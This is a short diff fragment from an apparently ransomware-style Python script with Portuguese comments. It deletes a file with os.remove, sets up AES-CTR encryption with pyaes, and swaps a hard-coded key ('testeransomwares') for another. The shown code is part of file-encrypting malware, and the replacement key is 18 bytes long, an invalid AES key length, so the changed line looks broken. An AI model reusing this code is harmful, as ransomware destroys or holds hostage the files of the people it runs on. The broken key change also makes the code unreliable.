@@ -11,7 +11,7 @@ file.close()
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"testeransomwares"
+key = b"2wedqwwsdqaq3241`^"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
